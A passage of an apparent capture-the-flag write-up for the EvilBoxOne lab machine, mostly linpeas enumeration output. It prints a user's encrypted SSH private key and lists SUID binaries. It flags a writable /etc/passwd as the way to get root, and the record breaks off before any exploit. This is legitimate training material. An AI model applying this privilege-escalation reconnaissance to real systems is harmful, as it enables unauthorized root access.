sys                                        **Nunca ha accedido**
sync                                       **Nunca ha accedido**
games                                      **Nunca ha accedido**
man                                        **Nunca ha accedido**
lp                                         **Nunca ha accedido**
mail                                       **Nunca ha accedido**
news                                       **Nunca ha accedido**
uucp                                       **Nunca ha accedido**
proxy                                      **Nunca ha accedido**
www-data                                   **Nunca ha accedido**
backup                                     **Nunca ha accedido**
list                                       **Nunca ha accedido**
irc                                        **Nunca ha accedido**
gnats                                      **Nunca ha accedido**
nobody                                     **Nunca ha accedido**
_apt                                       **Nunca ha accedido**
systemd-timesync                           **Nunca ha accedido**
systemd-network                            **Nunca ha accedido**
systemd-resolve                            **Nunca ha accedido**
messagebus                                 **Nunca ha accedido**
sshd                                       **Nunca ha accedido**
mowree           pts/0    192.168.56.52    jue nov 20 19:51:51 +0100 2025
systemd-coredump                           **Nunca ha accedido**

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                                     
                                                                                                                                      
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                      


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                    
                             ╚══════════════════════╝                                                                                 
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                       
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.7
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                                      
╔══════════╣ Searching mysql credentials and exec
                                                                                                                                      
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.38 (Debian)                                                                                
Server built:   2021-06-10T10:13:06
httpd Not Found
                                                                                                                                      
Nginx version: nginx Not Found
                                                                                                                                      
/etc/apache2/mods-enabled/php7.3.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.3.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.3.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.3.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.3.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.3.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 ago 16  2021 /etc/apache2/sites-enabled                                                                   
drwxr-xr-x 2 root root 4096 ago 16  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 ago 16  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 ago  8  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 ago 16  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71958 jul  2  2021 /etc/php/7.3/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71570 jul  2  2021 /etc/php/7.3/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                  
drwxr-xr-x 2 root root 4096 ago 16  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                           
                                                                                                                                      
-rwxr-xr-x 1 mowree mowree 1743 ago 16  2021 /home/mowree/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E
uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----



-rwxr-xr-x 1 mowree mowree 399 ago 16  2021 /home/mowree/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne

-rw-r--r-- 1 root root 177 ago 16  2021 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 97 ago 16  2021 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 397 ago 16  2021 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/home/mowree/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                          
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/Certigna.pem
/etc/ssl/certs/Certigna_Root_CA.pem
560PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                        
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                      


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 ago 16  2021 /etc/pam.d                                                                                   
-rw-r--r-- 1 root root 2133 ene 31  2020 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 ago 16  2021 /usr/share/keyrings                                                                          




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                        
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found                                                                                                                         
netpgpkeys Not Found                                                                                                                  
netpgp Not Found                                                                                                                      
                                                                                                                                      
-rw-r--r-- 1 root root 8700 mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 abr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 abr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 abr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 7443 abr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 abr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 abr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 8700 mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 mar 16  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 mar 16  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 mar 16  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 55625 mar 16  2021 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 36873 mar 16  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 mar 16  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 mar 16  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 mar 16  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 mar  1  2019 /usr/share/bash-completion/completions/postfix                                                


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                      


-rw-r--r-- 1 root root 69 jul  2  2021 /etc/php/7.3/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 jul  2  2021 /usr/share/php7.3-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 mar  1  2019 /usr/share/bash-completion/completions/bind                                                   
-rw-r--r-- 1 root root 856 mar  1  2019 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 abr 18  2019 /etc/skel/.bashrc                                                                            
-rwxr-xr-x 1 mowree mowree 3526 ago 16  2021 /home/mowree/.bashrc





-rw-r--r-- 1 root root 807 abr 18  2019 /etc/skel/.profile
-rwxr-xr-x 1 mowree mowree 807 ago 16  2021 /home/mowree/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                    
                      ╚════════════════════════════════════╝                                                                          
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                      
strings Not Found                                                                                                                     
strace Not Found                                                                                                                      
-rwsr-xr-x 1 root root 427K ene 31  2020 /usr/lib/openssh/ssh-keysign                                                                 
-rwsr-xr-x 1 root root 10K mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 50K jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 51K ene 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 63K jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                                      
-rwsr-xr-x 1 root root 35K ene 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 53K jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 83K jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63K ene 10  2019 /usr/bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                      
-rwxr-sr-x 1 root shadow 39K feb 14  2019 /usr/sbin/unix_chkpwd                                                                       
-rwxr-sr-x 1 root tty 15K may  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 19K dic  3  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 71K jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root shadow 31K jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 35K ene 10  2019 /usr/bin/wall
-rwxr-sr-x 1 root crontab 43K oct 11  2019 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 315K ene 31  2020 /usr/bin/ssh-agent

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                              
/etc/ld.so.conf                                                                                                                       
Content of /etc/ld.so.conf:                                                                                                           
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                         
  - /usr/local/lib                                                                                                                    
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                   
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                             
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                       
══╣ Current shell capabilities                                                                                                        
CapInh:  0x0000000000000000=                                                                                                          
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                          
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3129 feb 10  2019 usr.bin.man                                                                                  

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                               
files with acls in searched folders Not Found                                                                                         
                                                                                                                                      
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                     
total 12                                                                                                                              
drwxr-xr-x  2 root root 4096 ago 16  2021 .
drwxr-xr-x 71 root root 4096 ago 16  2021 ..
-rw-r--r--  1 root root  664 mar  1  2019 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                       
                                                                                                                                      
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                                                                     
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No                                                                                          
═╣ Can I read shadow plists? ............ No                                                                                          
═╣ Can I write shadow plists? ........... No                                                                                          
═╣ Can I read opasswd file? ............. No                                                                                          
═╣ Can I write in network-scripts? ...... No                                                                                          
═╣ Can I read root folder? .............. No                                                                                          
                                                                                                                                      
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                
/home/mowree/.bash_history
/root/
/var/www
/var/www/html
/var/www/html/robots.txt
/var/www/html/index.html
/var/www/html/secret
/var/www/html/secret/index.html
/var/www/html/secret/evil.php

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                      
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                      
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                     
/dev/mqueue                                                                                                                           
/dev/shm
/etc/passwd
/home/mowree
/run/lock
/run/user/1000
/run/user/1000/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                     
                                                                                                                                      


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                   
                            ╚═════════════════════════╝                                                                               
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                            
/usr/bin/gettext.sh                                                                                                                   

╔══════════╣ Executable files potentially added by user (limit 70)
2021-08-16+11:32:51.2906827240 /home/mowree/.ssh/authorized_keys                                                                      
2021-08-16+11:31:02.7834654620 /home/mowree/.ssh/id_rsa

╔══════════╣ Unexpected in root
/initrd.img                                                                                                                           
/initrd.img.old
/vmlinuz
/vmlinuz.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                     
/var/log/daemon.log
/var/log/syslog

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                             
logrotate 3.14.0                                                                                                                      

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/mowree (limit 20)
total 32                                                                                                                              
drwxr-xr-x 4 mowree mowree 4096 ago 16  2021 .
drwxr-xr-x 3 root   root   4096 ago 16  2021 ..
lrwxrwxrwx 1 root   root      9 ago 16  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 mowree mowree  220 ago 16  2021 .bash_logout
-rwxr-xr-x 1 mowree mowree 3526 ago 16  2021 .bashrc
drwxr-xr-x 3 mowree mowree 4096 ago 16  2021 .local
-rwxr-xr-x 1 mowree mowree  807 ago 16  2021 .profile
drwxr-xr-x 2 mowree mowree 4096 ago 16  2021 .ssh
-r-------- 1 mowree mowree   31 ago 16  2021 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/robots.txt                                                                                                              
/var/www/html/index.html
/var/www/html/secret/index.html
/var/www/html/secret/evil.php

╔══════════╣ Searching installed mail applications
                                                                                                                                      
╔══════════╣ Mails (limit 50)
                                                                                                                                      
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 7867 jul 16  1996 /usr/share/doc/telnet/README.old.gz                                                          
-rw-r--r-- 1 root root 303 oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz
-rw-r--r-- 1 root root 363752 abr 30  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 9731 jul 18  2021 /usr/lib/modules/4.19.0-17-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9716 ene 30  2021 /usr/lib/modules/4.19.0-14-amd64/kernel/drivers/net/team/team_mode_activebackup.ko


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                            
total 12K
drwxr-xr-x  3 root root 4,0K ago 16  2021 .
drwxr-xr-x 12 root root 4,0K ago 16  2021 ..
drwxr-xr-x  3 root root 4,0K ago 16  2021 html

/var/www/html:
total 28K
drwxr-xr-x 3 root root 4,0K ago 16  2021 .
drwxr-xr-x 3 root root 4,0K ago 16  2021 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 nov 20 19:31 /run/network/.ifstate.lock                                                                      
-rwxr-xr-x 1 mowree mowree 220 ago 16  2021 /home/mowree/.bash_logout
-rw-r--r-- 1 root root 220 abr 18  2019 /etc/skel/.bash_logout
-rw------- 1 root root 0 ago 16  2021 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
-rw-r--r-- 1 root root 22 mar 21  2019 /usr/share/debian-reference/.htaccess

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 mowree mowree 860337 jul  6  2024 /tmp/linpeas.sh                                                                        

╔══════════╣ Searching passwords in history files
                                                                                                                                      
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                            
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man7/credentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                      
╔══════════╣ Searching passwords inside logs (limit 70)
2021-08-16 09:15:27 configure base-passwd:amd64 3.5.46 3.5.46                                                                         
2021-08-16 09:15:27 install base-passwd:amd64 <none> 3.5.46
2021-08-16 09:15:27 status half-configured base-passwd:amd64 3.5.46
2021-08-16 09:15:27 status half-installed base-passwd:amd64 3.5.46
2021-08-16 09:15:27 status installed base-passwd:amd64 3.5.46
2021-08-16 09:15:27 status unpacked base-passwd:amd64 3.5.46
2021-08-16 09:15:32 status half-configured base-passwd:amd64 3.5.46
2021-08-16 09:15:32 status half-installed base-passwd:amd64 3.5.46
2021-08-16 09:15:32 status unpacked base-passwd:amd64 3.5.46
2021-08-16 09:15:32 upgrade base-passwd:amd64 3.5.46 3.5.46
2021-08-16 09:15:34 install passwd:amd64 <none> 1:4.5-1.1
2021-08-16 09:15:34 status half-installed passwd:amd64 1:4.5-1.1
2021-08-16 09:15:34 status unpacked passwd:amd64 1:4.5-1.1
2021-08-16 09:15:36 configure base-passwd:amd64 3.5.46 <none>
2021-08-16 09:15:36 configure passwd:amd64 1:4.5-1.1 <none>
2021-08-16 09:15:36 status half-configured base-passwd:amd64 3.5.46
2021-08-16 09:15:36 status half-configured passwd:amd64 1:4.5-1.1
2021-08-16 09:15:36 status installed base-passwd:amd64 3.5.46
2021-08-16 09:15:36 status installed passwd:amd64 1:4.5-1.1
2021-08-16 09:15:36 status unpacked base-passwd:amd64 3.5.46
2021-08-16 09:15:36 status unpacked passwd:amd64 1:4.5-1.1
Description: Set up users and passwords



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                    
                                ╚════════════════╝                                                                                    
Regexes to search for API keys aren't activated, use param '-r' 


mowree@EvilBoxOne:/tmp$ 
```


Key take:
- Interesting writable files owned by me or writable by everyone
	- `Writable passwd file? ................ /etc/passwd is writable`

```bash
mowree@EvilBoxOne:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
